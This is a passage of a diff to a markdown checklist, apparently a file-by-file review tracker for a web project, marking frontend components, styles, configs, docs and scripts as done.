-- [ ] `vitrine_front/src/sections/builder/NodePanel.module.css`
-- [ ] `vitrine_front/src/sections/builder/NodePanel.tsx`
-- [ ] `vitrine_front/src/sections/builder/useBuilderDemo.ts`
+- [x] `vitrine_front/src/sections/builder/BlockOverview.module.css`
+- [x] `vitrine_front/src/sections/builder/BlockOverview.tsx`
+- [x] `vitrine_front/src/sections/builder/ModelPicker.module.css`
+- [x] `vitrine_front/src/sections/builder/ModelPicker.tsx`
+- [x] `vitrine_front/src/sections/builder/NodePalette.module.css`
+- [x] `vitrine_front/src/sections/builder/NodePalette.tsx`
+- [x] `vitrine_front/src/sections/builder/NodePanel.module.css`
+- [x] `vitrine_front/src/sections/builder/NodePanel.tsx`
+- [x] `vitrine_front/src/sections/builder/useBuilderDemo.ts`
 
 **vitrine_front/src/sections/connectors/**
 
-- [ ] `vitrine_front/src/sections/connectors/useConnectorDemo.ts`
+- [x] `vitrine_front/src/sections/connectors/useConnectorDemo.ts`
 
 **vitrine_front/src/sections/hero/**
 
-- [ ] `vitrine_front/src/sections/hero/Ingestion.module.css`
-- [ ] `vitrine_front/src/sections/hero/Ingestion.tsx`
+- [x] `vitrine_front/src/sections/hero/Ingestion.module.css`
+- [x] `vitrine_front/src/sections/hero/Ingestion.tsx`
 
 **vitrine_front/src/sections/share/**
 
-- [ ] `vitrine_front/src/sections/share/ShareBrowser.module.css`
-- [ ] `vitrine_front/src/sections/share/ShareBrowser.tsx`
-- [ ] `vitrine_front/src/sections/share/useShareDemo.ts`
+- [x] `vitrine_front/src/sections/share/ShareBrowser.module.css`
+- [x] `vitrine_front/src/sections/share/ShareBrowser.tsx`
+- [x] `vitrine_front/src/sections/share/useShareDemo.ts`
 
 **vitrine_front/src/sections/**
 
-- [ ] `vitrine_front/src/sections/useTypewriter.ts`
+- [x] `vitrine_front/src/sections/useTypewriter.ts`
 
 **vitrine_front/src/styles/**
 
-- [ ] `vitrine_front/src/styles/global.css`
-- [ ] `vitrine_front/src/styles/tokens.css`
+- [x] `vitrine_front/src/styles/global.css`
+- [x] `vitrine_front/src/styles/tokens.css`
 
 **vitrine_front/src/**
 
-- [ ] `vitrine_front/src/vite-env.d.ts`
+- [x] `vitrine_front/src/vite-env.d.ts`
 
 **vitrine_front/**
 
-- [ ] `vitrine_front/tsconfig.app.json`
-- [ ] `vitrine_front/tsconfig.json`
-- [ ] `vitrine_front/tsconfig.node.json`
-- [ ] `vitrine_front/vite.config.ts`
+- [x] `vitrine_front/tsconfig.app.json`
+- [x] `vitrine_front/tsconfig.json`
+- [x] `vitrine_front/tsconfig.node.json`
+- [x] `vitrine_front/vite.config.ts`
 
 
 
@@ -1900,63 +1988,63 @@ Hors `node_modules`, `build`, `dist`, `.venv`, `generated`, lockfiles, binaires 
 
 **.claude/commands/**
 
-- [ ] `.claude/commands/maj-claude-md.md`
+- [x] `.claude/commands/maj-claude-md.md`
 
 **.github/workflows/**
 
-- [ ] `.github/workflows/jobs.yml`
+- [x] `.github/workflows/jobs.yml`
 
 **./**
 
-- [ ] `.gitignore`
-- [ ] `.gitmodules`
+- [x] `.gitignore`
+- [x] `.gitmodules`
 
 **.vscode/**
 
-- [ ] `.vscode/settings.json`
+- [x] `.vscode/settings.json`
 
 **./**
 
-- [ ] `CLAUDE.md`
-- [ ] `README.md`
+- [x] `CLAUDE.md`
+- [x] `README.md`
 
 **architecture/**
 
-- [ ] `architecture/agent-runtime-architecture-proposal.mmd`
-- [ ] `architecture/agent-runtime-flow.mmd`
-- [ ] `architecture/backend.mmd`
-- [ ] `architecture/document-flow.mmd`
+- [x] `architecture/agent-runtime-architecture-proposal.mmd`
+- [x] `architecture/agent-runtime-flow.mmd`
+- [x] `architecture/backend.mmd`
+- [x] `architecture/document-flow.mmd`
 
 **./**
 
-- [ ] `docker-compose.yml`
+- [x] `docker-compose.yml`
 
 **docs/**
 
-- [ ] `docs/beta_test_plan.md`
-- [ ] `docs/demande_infrastructure_ecole.md`
-- [ ] `docs/financial_strategy.md`
+- [x] `docs/beta_test_plan.md`
+- [x] `docs/demande_infrastructure_ecole.md`
+- [x] `docs/financial_strategy.md`
 
 **docs/greenlight-review/**
 
-- [ ] `docs/greenlight-review/beta_test_plan.md`
+- [x] `docs/greenlight-review/beta_test_plan.md`
 
 **docs/**
 
-- [ ] `docs/lean_canvas.md`
-- [ ] `docs/prompt_refacto_doc.md`
-- [ ] `docs/theme-audit-report.md`
+- [x] `docs/lean_canvas.md`
+- [x] `docs/prompt_refacto_doc.md`
+- [x] `docs/theme-audit-report.md`
 
 **./**
 
-- [ ] `package.json`
+- [x] `package.json`
 
 **scripts/**
 
-- [ ] `scripts/dev.sh`
-- [ ] `scripts/migrate.sh`
-- [ ] `scripts/start.sh`
+- [x] `scripts/dev.sh`
+- [x] `scripts/migrate.sh`
+- [x] `scripts/start.sh`
 
 **./**
 
-- [ ] `vercel.json`
+- [x] `vercel.json`
